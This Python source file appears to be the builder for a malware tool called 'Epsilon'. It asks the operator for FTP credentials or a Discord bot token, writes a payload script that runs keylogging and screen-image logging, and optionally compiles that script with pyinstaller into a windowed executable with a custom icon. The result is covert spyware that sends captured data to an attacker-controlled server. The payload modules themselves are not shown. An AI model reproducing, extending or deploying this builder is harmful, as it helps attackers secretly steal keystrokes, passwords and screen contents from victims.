import threading 
import os
import shutil
from core.sys_send import *

ASCII_DATA = '''
                                   
                    _____         _ _         
                    |   __|___ ___|_| |___ ___ 
                    |   __| . |_ -| | | . |   |
                    |_____|  _|___|_|_|___|_|_|
                        |_|                  (v 1.0 beta)
                    
                    https://www.github.com/sreyas-sreelal/epsilon
\n\n

'''
def start_epsilon():
    
    print_title()
    print_white(ASCII_DATA)
    DEBUG = True



    DEBUG = bool(input(print_green("Debug mode(True/False) : ")))
    Name = input(print_yellow("Provide name of the binary : "))

    print_green("Input network pathway for communication:")
    print_white("1.Ftp")
    print_white("2.Discord bot")

        

    network = input(print_white("Select your option : "))
    File = open(Name+'.py','w')
    File.write('import payloads.behaviour\n')

    if network == "1":
        address = input(print_white("input ftp address : "))
        username = input(print_white("input ftp username : "))
        password = input(print_white("input ftp password : "))
        File.write('from  network.ftpconn import init_creditinals\n')
        File.write('init_creditinals("' +  address + '","' + username + '","' + password + '")\n' )
        
        print_green("Select yor payloads (seprated by spaces) :")
        print_white("1.Satelite")
        print_white("2.KeyLogger")
        keys = input(print_white("Select your option(s) : "))
        
        list_keys = [int(k) for k in keys.split(' ')]
        
        for i in list_keys:
            
            if i == 1:
                File.write('from network.ftpconn import startimageloggging\n')
                File.write('startimageloggging()\n')
            elif i ==2:
                File.write('from network.ftpconn import startkeylogging\n')
                File.write('startkeylogging()\n')

    elif network == "2":
        token = input("Input your discord bot token")
        File.write('from network.discordbot import runbot,init_bot\n')
        File.write('init_bot("'+token+'")\n')
        File.write('runbot()\n')
        
    iconfile = input(print_magenta("icon file for the binary (if not needed leave it) : "))

    File.close()
    success("Creating payload " + Name + ".py")
    Create_Binary = input(print_yellow("Do you want to compile and create binary of created payload? (Y/N)"))

    if Create_Binary == 'Y' or Create_Binary == 'y':
        cmd = "pyinstaller "+ Name+".py" + ' -y --distpath="." --workpath="." --clean -F'
        if not DEBUG :
            cmd = cmd + " --windowed"
        if iconfile is not "":
            if '.ico' not in iconfile:
                iconfile = iconfile + '.ico'
            cmd = cmd + " --icon="+iconfile
        
        os.system(cmd) 
        try:
            shutil.rmtree(Name)
            os.remove(Name+'.spec')
        except:
            pass

if __name__ == '__main__':
	start_epsilon();